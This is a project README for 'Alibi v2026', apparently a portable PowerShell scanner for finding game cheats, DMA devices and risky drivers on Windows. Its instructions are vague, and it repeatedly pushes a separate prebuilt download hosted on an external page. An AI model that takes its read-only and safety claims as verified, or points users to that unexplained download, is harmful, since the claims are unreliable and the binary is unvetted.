# Alibi v2026 - Windows forensic anti-cheat scanner

> **Alibi is a Windows forensic anti-cheat scanner for read-only threat-hunting and cheat detection, built for portable PowerShell use and current in 2026.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/leozzpahughes3787/alibi-v2026-windows-scanner?style=flat-square)](https://github.com/leozzpahughes3787/alibi-v2026-windows-scanner)

---

<p align="center">
  <a href="https://leozzpahughes3787.github.io/alibi-v2026-windows-scanner/">
    <img src="https://img.shields.io/badge/Download-Alibi%20Latest-brightgreen?style=for-the-badge" alt="Download Alibi">
  </a>
</p>

> **[Direct Download - Alibi v2026](https://leozzpahughes3787.github.io/alibi-v2026-windows-scanner/)**

---

[Download Latest Build](https://leozzpahughes3787.github.io/alibi-v2026-windows-scanner/)

---

## What Alibi Does

Alibi is a Windows-centered forensic scanner for anti-cheat investigations, threat-hunting, and DFIR tasks. It runs in a read-only mode over the target system so analysts can search for PC cheat indicators, odd input hardware, console capture-chain activity, DMA-linked signals, BYOVD drivers, and vision-based aimbot tooling without altering the machine.

The workflow is meant for portable use when you do not want to deploy a full application. Its results are written as text and HTML reports, making it easier to inspect findings later on the desktop or include them in follow-up analysis.

---

## Capabilities

- Performs a read-only Windows scan and does not modify the system during inspection
- Produces both text and HTML output for review and sharing
- No installation required; designed as a portable workflow
- Identifies common PC cheat markers and suspicious input devices
- Checks for console-rig capture stack indicators and vision aimbot traces
- Supports major game targets such as Call of Duty, CS2, Apex, Tarkov, Rust, R6, and Marvel Rivals
- Offers optional opt-in retrieval of a driver safety list
- Intended for PowerShell-based security and forensic environments

---

## Getting Started

Clone the repository or download it, then run it from PowerShell on Windows.

1. Get the project files:
   - `git clone https://github.com/leozzpahughes3787/alibi-v2026-windows-scanner.git
2. Open PowerShell in the repository directory.
3. Start the scanner using the provided script or the entrypoint that matches the repository layout.
4. When the scan completes, review the report files saved on your Desktop.

If you are working from a packaged release, extract it first and then launch the included PowerShell workflow from the extracted directory.

---

## How to Use It

The usual pattern is to scan the local machine once and then inspect the generated reports.

- Launch the scan from PowerShell.
- Wait for the read-only checks to finish.
- Open the text report for a fast triage pass.
- Open the HTML report for a more structured view of the results.
- Use the output for manual review, threat-hunting, or broader DFIR follow-up.

Example workflow:

1. Run the scanner locally.
2. Look on the Desktop for the report files.
3. Compare any flagged indicators with the target game or environment.
4. Run it again after updates when you need a fresh snapshot.

---

## Configuration Notes

Alibi is driven mainly through its PowerShell workflow and runtime options. Any user-tunable settings should live next to the script or in the repository's documented configuration files.

Example configuration shape:

    scan:
      mode: read-only
      reports: desktop
      format:
        - text
        - html
      driver_safety_list: optional

If your setup needs custom paths or toggles, keep them inside the project directory so the portable workflow remains easy to move between systems.

---

## Requirements

- Windows
- PowerShell
- Enough local disk space for generated report files
- Permission to read the system areas you want to inspect
- Optional internet access if you choose to fetch the driver safety list

Alibi is built for Windows analysis and does not need a conventional installation.

---

## FAQ

**Will it make changes to the machine while scanning?**  
No. The workflow is described as read-only, so it is intended for inspection rather than modification.

**Where do the reports go?**  
The expected output is four report files written to the Desktop.

**Can I run it without installing anything?**  
Yes. It is designed around a portable, no-install workflow.

**What scenarios is it useful for?**  
It is aimed at anti-cheat investigation, gaming cheat detection, forensics, security review, and threat-hunting.

**How do I stay on the latest version?**  
Download the latest build from the project release location and rerun the scan whenever you want an updated snapshot.

**What if I need to adjust settings?**  
Refer to the repository files that accompany the PowerShell workflow for configuration details and available switches.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
